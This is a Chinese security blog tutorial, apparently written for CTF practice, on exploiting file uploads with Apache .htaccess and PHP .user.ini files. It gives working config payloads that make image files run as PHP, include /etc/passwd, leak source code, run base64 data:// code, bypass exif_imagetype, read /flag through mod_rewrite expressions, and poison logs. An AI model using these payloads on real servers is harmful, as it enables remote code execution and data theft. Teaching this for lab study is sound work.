---
title: 浅析文件上传之配置文件利用
url: https://mp.weixin.qq.com/s/YA8JIEflFjsfKJzfEATMWA
source: Doonsec's feed
date: 2026-04-12
fetch_date: 2026-04-13T04:56:19.775264
---

# 浅析文件上传之配置文件利用

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/g673ce4c7rkqicBmt4oEzjAA4X2TW3x8JlVPVBUQpKAPvJ2bWm1eEUJbvdm7pwHL3XdcuSUeGt0NO9unEUgXSPRN2Cf900Op7bZKZl9XErcs/0?wx_fmt=jpeg)

# 浅析文件上传之配置文件利用

浪漫土狗
浪漫土狗

正在思考ing

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

这个私有仓库长达近一年的平静状态，被三条并发连接骤然终结。登录来源锁定三个IP，凭据是好奇与莽撞，行为日志里写着“试图fork整个项目”。当原有管理员看着突然增长的贡献者列表，他明白——这个运行了三百多天的“单机存档”，从此刻起正式进入了联机模式。而我们的第一次协同作战，就从一**个被误传的配置文件**开始

# .htaccess文件

**作用**：分布式配置文件，一般用于URL重写、认证、访问控制等**；作用范围**：特定目录（一般是网站根目录）及其子目录**；优先级**：较高。可覆盖Apache的主要配置文件（httpd—conf）**；生效方式**：修改后立刻生效**；注意点**：只有含义apache服务才能使用

### 文件解析

有时会对文件后缀做限制，通过上传配置文件，使得其他后缀的文件中的php代码也能被解析

这里我使用的是buu上的靶场进行实验的:https://buuoj.cn/challenges#Upload-Labs-Linux

#### SetHandler指令

```
<FilesMatch  "shell.png">
SetHandler  application/x-httpd-php
</FilesMatch>
```

该指令意为将shell.png当作php解析

#### AddType指令

```
AddType application/x-httpd-php .png
```

该指令意为将png文件中的内容当作php解析

这两种写法是最常见的，在这里就不再做演示了

### 文件包含

通过 `php_value` 来设置 `auto_prepend_file`或者 `auto_append_file` 配置选项包含一些敏感文件, 同时在本目录或子目录中需要有可解析的 `php` 文件来触发。

`.htaccess` 分别通过这两个配置选项来包含 `/etc/passwd`,并访问同目录下的 `index.php`文件。

```
php_value auto_prepend_file /etc/passwd
```

![](https://mmbiz.qpic.cn/mmbiz_png/g673ce4c7rkbkswBP0FvdAtKC0sqfiaFX3exnHGQics6kPqekhtxrUKtyvcdoMIj9OUpicblV7JIMScaSkyBTzCDIXst2Pty8Re1ORslIKiazJM/640?wx_fmt=png&from=appmsg)

### 源码泄露

利用 `php_flag` 将 `engine` 设置为 0,在本目录和子目录中关闭 `php` 解析,造成源码泄露

```
php_flag engine 0
```

![](https://mmbiz.qpic.cn/mmbiz_png/g673ce4c7rkMzucFYswQkib9OibnlRA1D0vsnXe0U1ZPFj6M6jvTT49rw7kj2AGIpEiaQ75KCpRfc856rUw5gHmMJrdd3wJft13ww04BffAicho/640?wx_fmt=png&from=appmsg)

### 代码执行

`all_url_fopen`、`all_url_include` 为 `On`，利用data伪协议将数据流内容当作php代码处理

```
php_value auto_append_file data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
#强制在每个PHP文件的末尾"追加"包含data伪协议解码后的内容
```

![](https://mmbiz.qpic.cn/mmbiz_png/g673ce4c7rlylCxw38EibEzUicuyGnIIAYiaS988IojuB6iceLAiaS9iafqeGCoRMC6qMvUIibGO8boS9dNFTwtIVAnHkkLVmSxSdKJhjSYtHxic6W0/640?wx_fmt=png&from=appmsg)

前提是当前目录（或其子目录下）下有php文件

同目录或子目录没有 `php` 文件：

```
<Files ~ "^.ht">
 Require all granted #允许所有人访问匹配的文件
 Order allow,deny #先处理allow规则，再处理deny规则
 Allow from all #允许所有IP地址的客户端访问
</Files>
SetHandler application/x-httpd-php
# <?php phpinfo();?>
```

![](https://mmbiz.qpic.cn/mmbiz_png/g673ce4c7rmuImYiaYogQMia5XDAstBT4ENagQeSwiaxZkhbhK0Kw7D0GSDJOWtpz5OA0vQP8ccyHtIJOUXp9yGgx5yQiaWpr0rBOFKI3OiaGW0k/640?wx_fmt=png&from=appmsg)

### 绕过exif\_imagetype()传文件

`exif_imagetype()`读取图像文件的**前几个字节**,检测图像的实际格式，waf中如果有该函数检测的话，图像格式不正确可能会导致文件无法上传

`绕过方法`：使用`#`添加图像格式

**XBM**（X BitMap）是一种**纯文本格式的位图图像**格式，最初用于X Window系统

XBM文件实际上是**C语言源代码**，包含图像数据的数组定义：

```
#define test_width 16
#define test_height 16
static unsigned char test_bits[] = {
  0x0f, 0x00, 0x36, 0x00, 0x66, 0x00, 0xc6, 0x00,
  0xc6, 0x06, 0x66, 0x06, 0x36, 0x03, 0x0f, 0x00
};
```

格式：

```
#define width 20
#define height 10
AddType application/x-httpd-php .后缀
```

例题：https://www.nssctf.cn/problem/6590

### 重写引擎和条件表达式的小trick

#### 什么是 mod\_rewrite？

mod\_rewrite 是 Apache HTTP Server 的一个模块，提供基于规则的重写引擎，用于动态重写请求的 URL。它就像 URL 的"瑞士军刀"，可以：

* 将用户友好的 URL 映射到实际的文件路径
* 重定向旧 URL 到新位置
* 根据条件（如设备类型、IP地址等）提供不同内容
* 实现负载均衡和故障转移
* 增强网站安全性和SEO优化

#### 工作原理

mod\_rewrite 使用 PCRE（Perl Compatible Regular Expressions）正则表达式来匹配 URL，然后根据规则进行重写或重定向。它工作在 Apache 请求处理的不同阶段，可以访问服务器变量、环境变量和 HTTP 头信息。

#### 核心步骤

***启动重写引擎***：该选项默认是关闭的，在配置文件中要写将其打开

```
RewriteEngine On
```

***规则***：RewriteRule

```
RewriteRule Pattern Substitution [Flags]
```

* **Pattern**：正则表达式，匹配当前 URL
* **Substitution**：替换字符串，定义重写后的 URL
* **Flags**：可选标志，控制规则行为

**Substitution**可以是以下类型之一

| 类型 | 示例 | 说明 |
| --- | --- | --- |
| 相对路径 | `newpage.html` | 相对于当前目录 |
| 绝对路径 | `/var/www/new.html` | 文件系统路径 |
| URL 路径 | `/new/path` | 相对于文档根 |
| 完整 URL | `https://example.com/new` | 外部重定向 |
| 特殊值 | `-` | 请求继续使用原始URL，不进行重写 |

**常用标志 (Flags)**

| 标志 | 含义 | 说明 |
| --- | --- | --- |
| `[L]` | Last | 停止处理后续规则 |
| `[R]` | Redirect | 外部重定向（默认 302） |
| `[R=301]` | 永久重定向 | 搜索引擎更新索引 |
| `[NC]` | No Case | 不区分大小写 |
| `[QSA]` | Query String Append | 保留原始查询字符串 |
| `[F]` | Forbidden | 返回 403 禁止访问 |
| `[G]` | Gone | 返回 410 资源已删除 |

***条件***：RewriteCond

在规则前添加条件，只有满足所有条件时才执行规则：

```
RewriteCond TestString ConditionPattern [Flags]
RewriteRule Pattern Substitution [Flags]
```

**测试字符串(TestString)**

* 普通字符串
* 反向引用：`$1`-`$9`（来自 RewriteRule），`%1`-`%9`（来自 RewriteCond）
* 服务器变量：`%{变量名}`

例子：

```
RewriteCond expr "'hello123' =~ /([a-z]+)([0-9]+)/"
RewriteRule .* - [E=A:%1,E=B:%2]
```

分组1为hello，分组2为123，所以A=hello，B=123

**ConditionPattern（条件模式）**

| 模式 | 含义 | 示例 |
| --- | --- | --- |
| `!` | 逻辑非 | `!-f` 文件不存在 |
| `<` | 字典序小于 | `<example` |
| `>` | 字典序大于 | `>example` |
| `=` | 等于字符串 | `=example` |
| `-d` | 是目录 | `!-d` 不是目录 |
| `-f` | 是文件 | `-f` 文件存在 |
| `-s` | 文件存在且非空 | `-s` 非空文件 |
| `-l` | 是符号链接 | `-l` 符号链接 |

示例：

```
# 如果文件不存在且不是目录
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
# 则重写到 index.php
RewriteRule ^(.*)$ /index.php [L]
```

**设置环境变量**：

```
RewriteRule ^test/(.*)$ - [E=TEST_MODE:true]
#当访问以/test/开头的URL时，设置一个名为TEST_MODE的环境变量为true
```

#### 条件表达式

Apache HTTP Server 2.4+ 引入，用于在配置文件中编写条件逻辑和字符串表达式。

***表达式类型***：

* **条件表达式**：返回布尔值（true/false），用于条件判断
* **字符串表达式**：返回字符串值，用于头部设置、重定向等

***BNF语法***：这里只介绍expr

```
expr    ::= cond | string
```

**expr 可以定义为 cond 或者 string**用自然语言说：一个表达式（`expr`）可以是一个条件（`cond`）**或者**一个字符串（`string`）

***变量***：变量使用 `%{变量名}` 格式引用，值取决于请求处理阶段。当然也可用于函数的调用，语法为 %{funcname:funcargs}

*标识符*：

* 环境变量（%{VAR}e）：从环境变量中获取VAR变量的值
* 请求头（%{User-Agent}i）：从请求头中读取变量User-Agent的值
* 响应头（%{Set-Cookie}o）：从响应头中读取变量Set-Cookie的值
* 无后缀（如%{REQUEST\_URI}）：内置变量，直接读取

***函数***：

| 函数 | 描述 | 示例 |
| --- | --- | --- |
| `req('Header-Name')` | 获取请求头 | `req('User-Agent')` |
| `reqenv('VAR')` | 获取环境变量 | `reqenv('PATH')` |
| `tolower(string)` | 转换为小写 | `tolower('HELLO')` |
| `toupper(string)` | 转换为大写 | `toupper('hello')` |
| `md5(string)` | 计算MD5哈希 | `md5('text')` |
| `sha1(string)` | 计算SHA1哈希 | `sha1('text')` |
| `substr(string, start, length)` | 提取子字符串 | `substr('hello', 1, 3)` |
| `length(string)` | 字符串长度 | `length('hello')` |
| `escape(string)` | URI转义 | `escape('a b')` |
| `unescape(string)` | URI反转义 | `unescape('a%20b')` |
| `split(pattern, string)` | 按模式分割字符串 | `split(',', 'a,b,c')` |
| `join(list, separator)` | 连接列表元素 | `join({'a','b','c'}, ',')` |
| `file('/path')` | 读取文件内容 | `file('/flag')` |

#### ctf赛题中的运用

```
Header set FLAG "expr=%{file:/flag}"
```

`expr=`表示后面是要执行的表达式；`%{}`是变量/函数调用的语法，里面是调用`file`这个函数，参数为`/flag`

```
RewriteEngine On
RewriteCond expr "file('/flag') =~ /(.+)/"#判断/flag文件是否存在（=~是正则匹配运算符），若有，将flag值存给%1
RewriteRule .* - [E=FLAG:%1] #创建一个名为FLAG的环境变量，赋值为%1，即RewriteCond中正则匹配的第一个分组，里面存放的就是flag值
Header set FLAG "%{FLAG}e"#从环境变量中读取FLAG的值
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/g673ce4c7rnc6EAX191434PoJH6tlAl9OKhdnwcJdmRibrLfv4tUZC9SWGKamYPJKu0WBAB5f1icaRVlcu74FOwR2TLWnyxICwSQFCpEzrGPY/640?wx_fmt=png&from=appmsg)

```
RewriteEngine On
RewriteCond expr "file('/flag') =~ /^flag{/"
RewriteRule .* - [R=500]
```

如果正则匹配成功，就会重写至500，通过状态码来写脚本进行盲注。

例题：https://www.ctfplus.cn/problem-detail/2019277673527775232/description

# .user.ini

**作用**：特定用户或特定目录的配置文件，通常位于web应用程序的根目录下。用于覆盖或者追加全局配置文件（如php.ini）中的PHP配置选项**；作用范围**：存放该文件的目录及其子目录**；优先级**：较高，可以覆盖php.ini**；生效方式**：立即生效

```
auto_prepend_file  //在文件前插入
auto_append_file   //文件最后插入
```

`用法`：如果文件上传后的存储路径下（或其子目录下）有php文件，可以是使用该配置文件，让存放该配置文件的目录以及其子目录下的所有php文件都包含指定文件的文件内容

### 包含图片中的php代码

在图片中添加php恶意代码后上传，然后再上传配置文件，这样，当前目录及子目录下所有php文件都可以被利用![Pasted image 20260123170857.png](https://mmbiz.qpic.cn/mmbiz_png/g673ce4c7rnK1NQEibQaZdOB01gCs1AeCSUy8B7qzgPgtTWYYZjO062aPn5UNmJtllicvLJradwowEE2aM0FicMiabicAfqPnkIBGCa1AfX2vp2g/640?wx_fmt=png&from=appmsg)

### 包含日志文件

在消息头中写入php恶意代码，这样日志中的内容就会写入恶意代码![Pasted image 20260123171159.png](https://mmbiz.qpic.cn/sz_mmbiz_png/g673ce4c7rkuX3icWGcib3qC9qbicdIdldOLJg0ibibYCk6CRDI8VEWV9qlaMQvrzIxBW4icwapEVFV8gF25TSJfMzjAAeT2u0Zs8ciaRI7bO7fduA/640?wx_fmt=png&from=appmsg)

再上传.user.ini文件，内容为(这里以nginx为例)

```
auto_prepend_file=/var/log/nginx/access.log
```

![...